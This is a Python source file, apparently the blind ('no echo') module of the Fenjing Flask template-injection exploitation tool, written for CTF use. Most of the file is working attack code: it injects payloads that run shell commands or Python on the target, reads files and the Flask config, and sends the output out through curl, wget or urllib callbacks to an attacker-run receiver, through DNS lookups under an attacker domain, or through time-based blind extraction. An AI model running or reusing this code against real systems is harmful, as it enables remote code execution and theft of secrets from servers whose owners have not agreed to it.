"""无回显利用模块。"""

import argparse
import base64
import ipaddress
import json
import logging
import socket
import statistics
import subprocess
import textwrap
import threading
import time
import uuid

from dataclasses import dataclass
from enum import Enum
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Dict, List, Optional, Sequence, Union
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

if __package__ in {None, ""}:
    import sys

    package_root = Path(__file__).resolve().parent.parent
    if str(package_root) not in sys.path:
        sys.path.insert(0, str(package_root))

    from fenjing.const import (
        ATTRIBUTE,
        EVAL,
        FLASK_CONTEXT_VAR,
        GETFLAG_CODE_EVAL,
        ITEM,
        OS_POPEN_READ,
        STRING,
    )
    from fenjing.cracker import EvalArgsModePayloadGen
    from fenjing.full_payload_gen import FullPayloadGen
    from fenjing.options import NoEchoOptions
    from fenjing.submitter import ExtraParamAndDataCustomizable, Submitter
else:
    from .const import (
        ATTRIBUTE,
        EVAL,
        FLASK_CONTEXT_VAR,
        GETFLAG_CODE_EVAL,
        ITEM,
        OS_POPEN_READ,
        STRING,
    )
    from .cracker import EvalArgsModePayloadGen
    from .full_payload_gen import FullPayloadGen
    from .options import NoEchoOptions
    from .submitter import ExtraParamAndDataCustomizable, Submitter

logger = logging.getLogger("no_echo")

PayloadGeneratorLike = Union[FullPayloadGen, EvalArgsModePayloadGen]

CONFIG_EXPR = (
    "[v.config for v in sys.modules['__main__'].__dict__.values() "
    "if isinstance(v, sys.modules['flask'].Flask)][0]"
)


class NoEchoStrategy(Enum):
    HTTP = "http"
    DNS = "dns"
    TIME = "time"


class NoEchoCommandKind(Enum):
    SHELL = "shell"
    PYTHON_EXPR = "python_expr"
    PYTHON_STMT = "python_stmt"


@dataclass
class ParsedNoEchoCommand:
    kind: NoEchoCommandKind
    content: str


def _bool_value(value: str) -> bool:
    return value.lower() in {"1", "true", "yes", "on"}


def _append_query(url: str, params: Dict[str, str]) -> str:
    parsed = urlparse(url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    query.update({k: [v] for k, v in params.items()})
    return urlunparse(parsed._replace(query=urlencode(query, doseq=True)))


def _guess_callback_host(listen_host: str) -> str:
    if listen_host not in {"0.0.0.0", "::", ""}:
        return listen_host
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        host = sock.getsockname()[0]
        if host:
            return host
    except OSError:
        pass
    finally:
        sock.close()
    return "127.0.0.1"


def _is_loopback_hostname(hostname: Optional[str]) -> bool:
    if not hostname:
        return False
    normalized = hostname.strip("[]").strip().lower()
    if normalized == "localhost":
        return True
    try:
        return ipaddress.ip_address(normalized).is_loopback
    except ValueError:
        return False


def _is_private_hostname(hostname: Optional[str]) -> bool:
    if not hostname:
        return False
    normalized = hostname.strip("[]").strip().lower()
    try:
        ip_obj = ipaddress.ip_address(normalized)
    except ValueError:
        return False
    return ip_obj.is_private or ip_obj.is_link_local


def parse_no_echo_command(command: str) -> ParsedNoEchoCommand:
    text = command.strip()
    if not text:
        raise ValueError("Command is empty")
    if not text.startswith("@"):
        return ParsedNoEchoCommand(NoEchoCommandKind.SHELL, text)

    directive = text[1:].strip()
    if directive.startswith("eval"):
        return ParsedNoEchoCommand(
            NoEchoCommandKind.PYTHON_EXPR,
            directive[4:].strip(),
        )
    if directive.startswith("exec"):
        return ParsedNoEchoCommand(
            NoEchoCommandKind.PYTHON_STMT,
            directive[4:].strip(),
        )
    if directive.startswith("get-config"):
        return ParsedNoEchoCommand(NoEchoCommandKind.PYTHON_EXPR, CONFIG_EXPR)
    if directive.startswith("findflag"):
        return ParsedNoEchoCommand(NoEchoCommandKind.PYTHON_EXPR, GETFLAG_CODE_EVAL)
    if directive.startswith("ls"):
        path = directive[2:].strip()
        expr = "__import__('os').listdir()" if not path else (
            f"__import__('os').listdir({path!r})"
        )
        return ParsedNoEchoCommand(NoEchoCommandKind.PYTHON_EXPR, expr)
    if directive.startswith("cat"):
        filepath = directive[3:].strip()
        if not filepath:
            raise ValueError("@cat requires a path")
        return ParsedNoEchoCommand(
            NoEchoCommandKind.PYTHON_EXPR,
            f"open({filepath!r}, 'r').read()",
        )
    raise ValueError(f"Unsupported no-echo internal command: {command!r}")


class CallbackStore:
    """内存中的回调记录。"""

    def __init__(self):
        self._records: Dict[str, List[Dict[str, Any]]] = {}
        self._events: Dict[str, threading.Event] = {}
        self._lock = threading.Lock()

    def add(self, record: Dict[str, Any]):
        session = record["session"]
        with self._lock:
            self._records.setdefault(session, []).append(record)
            self._events.setdefault(session, threading.Event()).set()

    def get(self, session: str, consume: bool = False) -> Dict[str, Any]:
        with self._lock:
            records = list(self._records.get(session, []))
            if consume and session in self._records:
                del self._records[session]
                self._events.pop(session, None)
        return {
            "session": session,
            "records": records,
            "done": any(record.get("done") for record in records),
        }


class _ReceiverHandler(BaseHTTPRequestHandler):
    server_version = "FenjingNoEcho/1.0"

    def log_message(self, format: str, *args):
        return

    def _write_json(self, status: int, payload: Dict[str, Any]):
        body = json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        store: CallbackStore = self.server.callback_store  # type: ignore[attr-defined]
        if parsed.path == "/healthz":
            self._write_json(200, {"ok": True})
            return
        if parsed.path == "/callback":
            params = parse_qs(parsed.query, keep_blank_values=True)
            session = params.get("s", [""])[0]
            if not session:
                self._write_json(400, {"ok": False, "error": "missing session"})
                return
            try:
                index = int(params.get("i", ["-1"])[0])
            except ValueError:
                index = -1
            store.add(
                {
                    "session": session,
                    "kind": params.get("k", ["data"])[0],
                    "probe": params.get("probe", [""])[0],
                    "transport": params.get("transport", [""])[0],
                    "index": index,
                    "data": params.get("d", [""])[0],
                    "done": _bool_value(params.get("done", ["0"])[0]),
                    "error": _bool_value(params.get("e", ["0"])[0]),
                    "fqdn": params.get("fqdn", [""])[0],
                    "created_at": time.time(),
                }
            )
            self._write_json(200, {"ok": True})
            return
        if parsed.path == "/records":
            params = parse_qs(parsed.query, keep_blank_values=True)
            session = params.get("session", [""])[0]
            if not session:
                self._write_json(400, {"ok": False, "error": "missing session"})
                return
            consume = _bool_value(params.get("consume", ["0"])[0])
            self._write_json(200, store.get(session, consume=consume))
            return
        self._write_json(404, {"ok": False, "error": "not found"})


class NoEchoHTTPReceiver:
    """本地 HTTP 回调接收器，也可通过 CLI 单独启动。"""

    def __init__(
        self,
        listen_host: str,
        listen_port: int,
        advertised_callback_url: Optional[str] = None,
    ):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.advertised_callback_url = advertised_callback_url
        self._store = CallbackStore()
        self._server: Optional[ThreadingHTTPServer] = None
        self._thread: Optional[threading.Thread] = None

    @property
    def callback_url(self) -> str:
        if self.advertised_callback_url:
            return self.advertised_callback_url
        if self._server is None:
            raise RuntimeError("Receiver is not started")
        host = _guess_callback_host(self.listen_host)
        return f"http://{host}:{self._server.server_port}/callback"

    @property
    def api_url(self) -> str:
        if self._server is None:
            raise RuntimeError("Receiver is not started")
        return f"http://127.0.0.1:{self._server.server_port}/records"

    def start(self):
        if self._server is not None:
            return
        self._server = ThreadingHTTPServer(
            (self.listen_host, self.listen_port),
            _ReceiverHandler,
        )
        self._server.callback_store = self._store  # type: ignore[attr-defined]
        self._thread = threading.Thread(
            target=self._server.serve_forever,
            name="fenjing-no-echo-receiver",
            daemon=True,
        )
        self._thread.start()
        logger.info(
            "No-echo receiver listening on [blue]%s[/]",
            self.callback_url,
            extra={"markup": True, "highlighter": None},
        )

    def stop(self):
        if self._server is None:
            return
        self._server.shutdown()
        self._server.server_close()
        self._server = None
        self._thread = None


class NoEchoReceiverClient:
    """轮询 HTTP 回调记录。"""

    def __init__(
        self,
        callback_url: str,
        api_url: str,
        poll_interval: float,
    ):
        self.callback_url = callback_url
        self.api_url = api_url
        self.poll_interval = poll_interval
        self.session = requests.Session()

    def close(self):
        self.session.close()

    def fetch(self, session_id: str, consume: bool = False) -> Dict[str, Any]:
        response = self.session.get(
            self.api_url,
            params={"session": session_id, "consume": int(consume)},
            timeout=5,
        )
        response.raise_for_status()
        return response.json()

    def wait_for_probe(
        self,
        session_id: str,
        probe_id: str,
        timeout: float,
    ) -> Optional[str]:
        deadline = time.perf_counter() + timeout
        while time.perf_counter() < deadline:
            data = self.fetch(session_id)
            for record in data.get("records", []):
                if record.get("probe") == probe_id:
                    self.fetch(session_id, consume=True)
                    return record.get("transport") or None
            time.sleep(self.poll_interval)
        self.fetch(session_id, consume=True)
        return None

    def wait_for_completion(self, session_id: str, timeout: float) -> Dict[str, Any]:
        deadline = time.perf_counter() + timeout
        last: Dict[str, Any] = {"session": session_id, "records": [], "done": False}
        while time.perf_counter() < deadline:
            last = self.fetch(session_id)
            if last.get("done"):
                break
            time.sleep(self.poll_interval)
        if last.get("records") or last.get("done"):
            return self.fetch(session_id, consume=True)
        return last


def _extract_strings_from_dnslog_payload(data: Any) -> List[str]:
    if isinstance(data, str):
        return [line.strip() for line in data.splitlines() if "." in line]
    if isinstance(data, list):
        result: List[str] = []
        for item in data:
            result.extend(_extract_strings_from_dnslog_payload(item))
        return result
    if isinstance(data, dict):
        result: List[str] = []
        for key in ["name", "query", "host", "domain", "value"]:
            if isinstance(data.get(key), str):
                result.append(data[key])
        for value in data.values():
            result.extend(_extract_strings_from_dnslog_payload(value))
        return result
    return []


class DNSLogCommandClient:
    """通过用户提供的命令轮询 DNSLog 记录。"""

    def __init__(self, domain: str, command: str, poll_interval: float):
        self.domain = domain.strip(".").lower()
        self.command = command
        self.poll_interval = poll_interval

    def fetch(self) -> List[str]:
        output = subprocess.check_output(
            self.command,
            shell=True,
            stderr=subprocess.STDOUT,
            text=True,
        )
        output = output.strip()
        if not output:
            return []
        try:
            return _extract_strings_from_dnslog_payload(json.loads(output))
        except json.JSONDecodeError:
            return _extract_strings_from_dnslog_payload(output)

    def wait_for_probe(self, session_id: str, probe_id: str, timeout: float) -> bool:
        marker = f"{probe_id}.{session_id}.{self.domain}"
        deadline = time.perf_counter() + timeout
        while time.perf_counter() < deadline:
            if any(marker in host.lower().rstrip(".") for host in self.fetch()):
                return True
            time.sleep(self.poll_interval)
        return False

    def wait_for_completion(self, session_id: str, timeout: float) -> List[str]:
        done_marker = f"done.{session_id}.{self.domain}"
        deadline = time.perf_counter() + timeout
        last: List[str] = []
        while time.perf_counter() < deadline:
            last = [host.lower().rstrip(".") for host in self.fetch()]
            if any(host == done_marker for host in last):
                return last
            time.sleep(self.poll_interval)
        return last


def _decode_base32(data: str) -> bytes:
    if not data:
        return b""
    padding = "=" * ((8 - len(data) % 8) % 8)
    return base64.b32decode((data + padding).upper())


class NoEchoExecutor:
    """负责无回显命令执行、结果外带与时间盲注。"""

    def __init__(
        self,
        submitter: Submitter,
        payload_generator: PayloadGeneratorLike,
        options: NoEchoOptions,
    ):
        self.submitter = submitter
        self.payload_generator = payload_generator
        self.options = options
        self._eval_param_name = f"fenjing_no_echo_{uuid.uuid4().hex[:6]}"
        self._cached_eval_param_payload: Optional[str] = None
        self._eval_param_supported: Optional[bool] = None
        self._receiver: Optional[NoEchoHTTPReceiver] = None
        self._http_client: Optional[NoEchoReceiverClient] = None
        self._dns_client: Optional[DNSLogCommandClient] = None
        self._strategy: Optional[NoEchoStrategy] = None
        self._http_transport: Optional[str] = None
        self._dns_transport: Optional[str] = None
        self._blind_baseline_duration: Optional[float] = None

    def close(self):
        if self._http_client:
            self._http_client.close()
            self._http_client = None
        if self._receiver:
            self._receiver.stop()
            self._receiver = None

    def _ensure_http_client(self) -> NoEchoReceiverClient:
        if self._http_client is not None:
            return self._http_client
        callback_url = self.options.callback_url
        api_url = self.options.receiver_api
        if callback_url is None and api_url:
            parsed = urlparse(api_url)
            callback_url = urlunparse(parsed._replace(path="/callback", query=""))
        if api_url is None:
            self._receiver = NoEchoHTTPReceiver(
                listen_host=self.options.listen_host,
                listen_port=self.options.listen_port,
                advertised_callback_url=callback_url,
            )
            self._receiver.start()
            callback_url = self._receiver.callback_url
            api_url = self._receiver.api_url
        if callback_url is None or api_url is None:
            raise RuntimeError("No valid HTTP callback configuration found")
        parsed_callback = urlparse(callback_url)
        if _is_loopback_hostname(parsed_callback.hostname):
            logger.warning(
                "No-echo callback URL %s points to a loopback address. "
                "Remote targets usually cannot reach it; set a reachable callback URL if needed.",
                callback_url,
            )
        self._http_client = NoEchoReceiverClient(
            callback_url=callback_url,
            api_url=api_url,
            poll_interval=self.options.poll_interval,
        )
        return self._http_client

    def _ensure_dns_client(self) -> Optional[DNSLogCommandClient]:
        if self._dns_client is not None:
            return self._dns_client
        if not self.options.dns_domain or not self.options.dnslog_command:
            return None
        self._dns_client = DNSLogCommandClient(
            domain=self.options.dns_domain,
            command=self.options.dnslog_command,
            poll_interval=self.options.poll_interval,
        )
        return self._dns_client

    def _submit_os_command(self, command: str):
        payload, _ = self.payload_generator.generate(OS_POPEN_READ, command)
        if payload is None:
            raise RuntimeError("Failed generating no-echo shell payload")
        result = self.submitter.submit(payload)
        if result is None:
            raise RuntimeError("Submitting no-echo shell payload failed")
        return result

    def _submit_python_expression(self, expression: str):
        if isinstance(self.submitter, ExtraParamAndDataCustomizable):
            if self._eval_param_supported is not False and self._cached_eval_param_payload is None:
                payload, _ = self.payload_generator.generate(
                    EVAL,
                    (
                        ITEM,
                        (ATTRIBUTE, (FLASK_CONTEXT_VAR, "request"), "values"),
                        self._eval_param_name,
                    ),
                )
                if payload is not None:
                    self._cached_eval_param_payload = payload
                    self._eval_param_supported = True
                else:
                    self._eval_param_supported = False
                    logger.debug(
                        "No-echo eval extra-param payload is unavailable, "
                        "falling back to inline eval expressions.",
                    )
            if self._cached_eval_param_payload is not None:
                self.submitter.set_extra_param(self._eval_param_name, expression)
                try:
                    result = self.submitter.submit(self._cached_eval_param_payload)
                finally:
                    self.submitter.unset_extra_param(self._eval_param_name)
                if result is None:
                    raise RuntimeError("Submitting no-echo eval payload failed")
                return result
        payload, _ = self.payload_generator.generate(EVAL, (STRING, expression))
        if payload is None:
            raise RuntimeError("Failed generating no-echo eval payload")
        result = self.submitter.submit(payload)
        if result is None:
            raise RuntimeError("Submitting no-echo eval payload failed")
        return result

    def _build_result_code(self, parsed_command: ParsedNoEchoCommand) -> str:
        if parsed_command.kind == NoEchoCommandKind.SHELL:
            timeout_value = self.options.command_timeout
            timeout_marker = (
                "COMMAND_TIMEOUT"
                if timeout_value <= 0
                else f"COMMAND_TIMEOUT({timeout_value}s)"
            )
            body = f"""
            try:
                _process = subprocess.Popen(
                    {parsed_command.content!r},
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                )
                if {timeout_value!r} <= 0:
                    _result = _process.communicate()[0]
                else:
                    _result = _process.communicate(timeout={timeout_value!r})[0]
                _error = "0"
            except subprocess.TimeoutExpired as _exc:
                _process.kill()
                _stdout = _exc.stdout or b""
                _stderr = _exc.stderr or b""
                _collected = _process.communicate()[0]
                _result = _stdout + _stderr + _collected or {timeout_marker!r}.encode()
                _error = "1"
            except Exception:
                _result = traceback.format_exc()
                _error = "1"
            """
        elif parsed_command.kind == NoEchoCommandKind.PYTHON_EXPR:
            body = f"""
            try:
                _result = ({parsed_command.content})
                _error = "0"
            except Exception:
                _result = traceback.format_exc()
                _error = "1"
            """
        else:
            body = f"""
            try:
                exec({parsed_command.content!r})
                _result = "EXEC_OK"
                _error = "0"
            except Exception:
                _result = traceback.format_exc()
                _error = "1"
            """
        return textwrap.dedent(
            f"""
            import subprocess
            import traceback
            {body}
            if isinstance(_result, bytes):
                _raw = _result
            elif isinstance(_result, bytearray):
                _raw = bytes(_result)
            elif isinstance(_result, str):
                _raw = _result.encode()
            else:
                _raw = repr(_result).encode()
            """
        ).strip()

    def _build_http_exec_expression(
        self,
        parsed_command: ParsedNoEchoCommand,
        callback_url: str,
        session_id: str,
    ) -> str:
        code = self._build_result_code(parsed_command)
        code += "\n" + textwrap.dedent(
            f"""
            import base64
            import urllib.parse
            import urllib.request
            _payload = base64.b64encode(_raw).decode()
            for _offset in range(0, len(_payload), {self.options.chunk_size}):
                _chunk = _payload[_offset:_offset + {self.options.chunk_size}]
                _query = urllib.parse.urlencode(
                    {{
                        "s": {session_id!r},
                        "k": "data",
                        "i": str(_offset // {self.options.chunk_size}),
                        "d": _chunk,
                        "e": _error,
                    }}
                )
                urllib.request.urlopen({callback_url!r} + "?" + _query, timeout=5).read()
            _done = urllib.parse.urlencode(
                {{"s": {session_id!r}, "k": "data", "done": "1", "e": _error}}
            )
            urllib.request.urlopen({callback_url!r} + "?" + _done, timeout=5).read()
            """
        ).strip()
        return f"exec({code!r})"

    def _build_http_probe_expression(
        self,
        callback_url: str,
        session_id: str,
        probe_id: str,
        transport: str,
    ) -> str:
        code = textwrap.dedent(
            f"""
            import urllib.parse
            import urllib.request
            _query = urllib.parse.urlencode(
                {{
                    "s": {session_id!r},
                    "k": "probe",
                    "probe": {probe_id!r},
                    "transport": {transport!r},
                }}
            )
            urllib.request.urlopen({callback_url!r} + "?" + _query, timeout=5).read()
            """
        ).strip()
        return f"exec({code!r})"

    def _build_dns_exec_expression(
        self,
        parsed_command: ParsedNoEchoCommand,
        session_id: str,
    ) -> str:
        assert self.options.dns_domain is not None
        domain = self.options.dns_domain.strip(".")
        code = self._build_result_code(parsed_command)
        code += "\n" + textwrap.dedent(
            f"""
            import base64
            import socket
            _payload = base64.b32encode(_raw).decode().rstrip("=").lower()
            for _offset in range(0, len(_payload), 30):
                _chunk = _payload[_offset:_offset + 30]
                _fqdn = f"{{_chunk}}.{{_offset // 30}}.{session_id}.{domain}"
                try:
                    socket.getaddrinfo(_fqdn, 80)
                except Exception:
                    pass
            try:
                socket.getaddrinfo("done.{session_id}.{domain}", 80)
            except Exception:
                pass
            """
        ).strip()
        return f"exec({code!r})"

    def _build_dns_probe_expression(self, session_id: str, probe_id: str) -> str:
        assert self.options.dns_domain is not None
        domain = self.options.dns_domain.strip(".")
        code = textwrap.dedent(
            f"""
            import socket
            try:
                socket.getaddrinfo("{probe_id}.{session_id}.{domain}", 80)
            except Exception:
                pass
            """
        ).strip()
        return f"exec({code!r})"

    def _build_cache_priming_expression(
        self,
        parsed_command: ParsedNoEchoCommand,
        cache_key: str,
    ) -> str:
        code = self._build_result_code(parsed_command)
        code += "\n" + textwrap.dedent(
            f"""
            import base64
            __import__("builtins").__dict__[{cache_key!r}] = (
                base64.b64encode(_raw).decode()
            )
            """
        ).strip()
        return f"exec({code!r})"

    @staticmethod
    def _build_cache_read_expression(cache_key: str) -> str:
        return f"__import__('builtins').__dict__.get({cache_key!r}, '')"

    def _prime_blind_cache(
        self,
        parsed_command: ParsedNoEchoCommand,
        cache_key: str,
    ):
        self._submit_python_expression(
            self._build_cache_priming_expression(parsed_command, cache_key)
        )

    def _clear_blind_cache(self, cache_key: str):
        try:
            self._submit_python_expression(
                f"__import__('builtins').__dict__.pop({cache_key!r}, None)"
            )
        except Exception:
            logger.debug("Failed clearing no-echo blind cache %s", cache_key)

    def _measure_sleep_condition(self, condition_expr: str) -> bool:
        sleep_expr = (
            f"(__import__('time').sleep({self.options.blind_delay}) "
            f"if {condition_expr} else 0)"
        )
        baseline = self._get_blind_baseline_duration()
        trigger = baseline + self.options.blind_delay * self.options.blind_threshold
        decisions: List[bool] = []
        for _ in range(3):
            started = time.perf_counter()
            self._submit_python_expression(sleep_expr)
            duration = time.perf_counter() - started
            decisions.append(duration >= trigger)
            if len(decisions) >= 2 and decisions[-1] == decisions[-2]:
                return decisions[-1]
        return sum(decisions) >= 2

    def _get_blind_baseline_duration(self) -> float:
        if self._blind_baseline_duration is not None:
            return self._blind_baseline_duration
        samples: List[float] = []
        for _ in range(3):
            started = time.perf_counter()
            self._submit_python_expression("0")
            samples.append(time.perf_counter() - started)
        self._blind_baseline_duration = statistics.median(samples)
        logger.debug(
            "Blind baseline duration calibrated to %.4fs",
            self._blind_baseline_duration,
        )
        return self._blind_baseline_duration

    def _estimate_blind_length(self, data_expr: str) -> int:
        if not self._measure_sleep_condition(f"(lambda _d: len(_d) > 0)({data_expr})"):
            return 0
        high = 1
        while high < self.options.blind_max_length and self._measure_sleep_condition(
            f"(lambda _d: len(_d) > {high})({data_expr})"
        ):
            high *= 2
        high = min(high, self.options.blind_max_length)
        low = high // 2
        while low < high:
            middle = (low + high) // 2
            if self._measure_sleep_condition(
                f"(lambda _d: len(_d) > {middle})({data_expr})"
            ):
                low = middle + 1
            else:
                high = middle
        return low

    def _blind_extract_base64(self, parsed_command: ParsedNoEchoCommand) -> str:
        cache_key = f"_fenjing_no_echo_{uuid.uuid4().hex[:8]}"
        data_expr = self._build_cache_read_expression(cache_key)
        self._prime_blind_cache(parsed_command, cache_key)
        try:
            result_length = self._estimate_blind_length(data_expr)
            logger.info(
                "Blind mode detected [blue]%d[/] encoded bytes",
                result_length,
                extra={"markup": True, "highlighter": None},
            )
            result_chars: List[str] = []
            for index in range(result_length):
                low = 0
                high = 127
                while low < high:
                    middle = (low + high) // 2
                    if self._measure_sleep_condition(
                        f"(lambda _d: len(_d) > {index} and ord(_d[{index}]) > {middle})({data_expr})"
                    ):
                        low = middle + 1
                    else:
                        high = middle
                result_chars.append(chr(low))
            return "".join(result_chars)
        finally:
            self._clear_blind_cache(cache_key)

    def _probe_http_transport(self) -> Optional[str]:
        client = self._ensure_http_client()
        session_id = uuid.uuid4().hex
        probe_id = uuid.uuid4().hex[:8]
        shell_probes = [
            (
                "curl",
                f'curl -fsS -m {max(2, int(self.options.probe_timeout))} '
                f'"{_append_query(client.callback_url, {"s": session_id, "k": "probe", "probe": probe_id, "transport": "curl"})}" '
                "> /dev/null 2>&1",
            ),
            (
                "wget",
                f'wget -q -T {max(2, int(self.options.probe_timeout))} -O - '
                f'"{_append_query(client.callback_url, {"s": session_id, "k": "probe", "probe": probe_id, "transport": "wget"})}" '
                "> /dev/null 2>&1",
            ),
        ]
        for transport, command in shell_probes:
            try:
                self._submit_os_command(command)
            except Exception:
                logger.debug("HTTP probe transport %s submission failed", transport)
            detected = client.wait_for_probe(session_id, probe_id, self.options.probe_timeout)
            if detected:
                return detected
        try:
            self._submit_python_expression(
                self._build_http_probe_expression(
                    client.callback_url,
                    session_id,
                    probe_id,
                    "urllib",
                )
            )
        except Exception:
            logger.debug("HTTP probe transport urllib submission failed")
        return client.wait_for_probe(session_id, probe_id, self.options.probe_timeout)

    def _probe_dns_transport(self) -> Optional[str]:
        client = self._ensure_dns_client()
        if client is None:
            return None
        session_id = uuid.uuid4().hex[:10]
        probe_id = uuid.uuid4().hex[:8]
        shell_probes = [
            ("nslookup", f"nslookup {probe_id}.{session_id}.{client.domain} > /dev/null 2>&1"),
            ("ping", f"ping -c 1 {probe_id}.{session_id}.{client.domain} > /dev/null 2>&1"),
        ]
        for transport, command in shell_probes:
            try:
                self._submit_os_command(command)
            except Exception:
                logger.debug("DNS probe transport %s submission failed", transport)
            if client.wait_for_probe(session_id, probe_id, self.options.probe_timeout):
                return transport
        try:
            self._submit_python_expression(
                self._build_dns_probe_expression(session_id, probe_id)
            )
        except Exception:
            logger.debug("DNS probe transport socket submission failed")
        if client.wait_for_probe(session_id, probe_id, self.options.probe_timeout):
            return "socket"
        return None

    def detect_strategy(self) -> NoEchoStrategy:
        if self._strategy is not None:
            return self._strategy
        if self.options.outbound_enabled:
            try:
                self._http_transport = self._probe_http_transport()
            except Exception as exc:  # pylint: disable=W0718
                logger.debug("HTTP probe failed: %r", exc)
                self._http_transport = None
            if self._http_transport:
                logger.info(
                    "Selected no-echo strategy [cyan bold]HTTP[/] via [blue]%s[/]",
                    self._http_transport,
                    extra={"markup": True, "highlighter": None},
                )
                self._strategy = NoEchoStrategy.HTTP
                return self._strategy
            try:
                self._dns_transport = self._probe_dns_transport()
            except Exception as exc:  # pylint: disable=W0718
                logger.debug("DNS probe failed: %r", exc)
                self._dns_transport = None
            if self._dns_transport:
                logger.info(
                    "Selected no-echo strategy [cyan bold]DNS[/] via [blue]%s[/]",
                    self._dns_transport,
                    extra={"markup": True, "highlighter": None},
                )
                self._strategy = NoEchoStrategy.DNS
                return self._strategy
        logger.info(
            "Selected no-echo strategy [cyan bold]TIME[/]",
            extra={"markup": True, "highlighter": None},
        )
        self._strategy = NoEchoStrategy.TIME
        return self._strategy

    def _decode_http_records(self, records: Sequence[Dict[str, Any]]) -> str:
        chunks = {
            int(record["index"]): record["data"]
            for record in records
            if record.get("kind") == "data" and record.get("data")
        }
        encoded = "".join(chunks[index] for index in sorted(chunks))
        decoded = base64.b64decode(encoded or b"")
        return decoded.decode(errors="replace")

    def _decode_dns_records(self, session_id: str, hosts: Sequence[str]) -> str:
        assert self.options.dns_domain is not None
        suffix = f".{session_id}.{self.options.dns_domain.strip('.')}".lower()
        chunks: Dict[int, str] = {}
        for host in hosts:
            host = host.lower().rstrip(".")
            if not host.endswith(suffix):
                continue
            prefix = host[: -len(suffix)].strip(".")
            if prefix == "done":
                continue
            chunk, _, index_text = prefix.rpartition(".")
            if not chunk:
                continue
            try:
                chunks[int(index_text)] = chunk
            except ValueError:
                continue
        encoded = "".join(chunks[index] for index in sorted(chunks))
        return _decode_base32(encoded).decode(errors="replace")

    def _execute_http(self, parsed_command: ParsedNoEchoCommand) -> str:
        client = self._ensure_http_client()
        session_id = uuid.uuid4().hex
        expression = self._build_http_exec_expression(
            parsed_command,
            client.callback_url,
            session_id,
        )
        self._submit_python_expression(expression)
        result = client.wait_for_completion(
            session_id,
            timeout=max(self.options.probe_timeout * 2, 10.0),
        )
        if not result.get("done"):
            raise RuntimeError("HTTP outbound execution timed out")
        return self._decode_http_records(result.get("records", []))

    def _execute_dns(self, parsed_command: ParsedNoEchoCommand) -> str:
        client = self._ensure_dns_client()
        if client is None:
            raise RuntimeError("DNS outbound is not configured")
        session_id = uuid.uuid4().hex[:10]
        self._submit_python_expression(
            self._build_dns_exec_expression(parsed_command, session_id)
        )
        records = client.wait_for_completion(
            session_id,
            timeout=max(self.options.probe_timeout * 3, 12.0),
        )
        if not any(
            record == f"done.{session_id}.{client.domain}"
            for record in [host.lower().rstrip(".") for host in records]
        ):
            raise RuntimeError("DNS outbound execution timed out")
        return self._decode_dns_records(session_id, records)

    def _execute_blind(self, parsed_command: ParsedNoEchoCommand) -> str:
        encoded = self._blind_extract_base64(parsed_command)
        decoded = base64.b64decode(encoded or b"")
        return decoded.decode(errors="replace")

    def execute(self, command: str) -> str:
        parsed_command = parse_no_echo_command(command)
        strategy = self.detect_strategy()
        if strategy == NoEchoStrategy.HTTP:
            return self._execute_http(parsed_command)
        if strategy == NoEchoStrategy.DNS:
            return self._execute_dns(parsed_command)
        return self._execute_blind(parsed_command)


def run_no_echo_receiver(
    host: str,
    port: int,
    callback_url: Optional[str] = None,
):
    receiver = NoEchoHTTPReceiver(host, port, callback_url)
    receiver.start()
    logger.info(
        "Receiver callback URL: [blue]%s[/], records API: [blue]%s[/]",
        receiver.callback_url,
        receiver.api_url,
        extra={"markup": True, "highlighter": None},
    )
    callback_host = urlparse(receiver.callback_url).hostname
    if callback_url is None and _is_loopback_hostname(callback_host):
        logger.warning(
            "The advertised callback URL is loopback-only (%s). "
            "This only works for local self-tests; remote CTF targets cannot reach it. "
            "Use --host 0.0.0.0 and pass --callback-url with your public address.",
            receiver.callback_url,
        )
    elif callback_url is None and _is_private_hostname(callback_host):
        logger.warning(
            "The advertised callback URL uses a private/LAN address (%s). "
            "If the target is on the public Internet, pass --callback-url with your public IP or domain.",
            receiver.callback_url,
        )
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        receiver.stop()


def main():
    parser = argparse.ArgumentParser(
        description="Start Fenjing no-echo HTTP callback receiver.",
    )
    parser.add_argument(
        "--host",
        default="0.0.0.0",
        help="Receiver listen host, default: 0.0.0.0",
    )
    parser.add_argument(
        "--port",
        default=18000,
        type=int,
        help="Receiver listen port, default: 18000",
    )
    parser.add_argument(
        "--callback-url",
        default=None,
        help="Advertised callback URL shown to the target, optional",
    )
    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO)
    run_no_echo_receiver(args.host, args.port, args.callback_url)


if __name__ == "__main__":
    main()
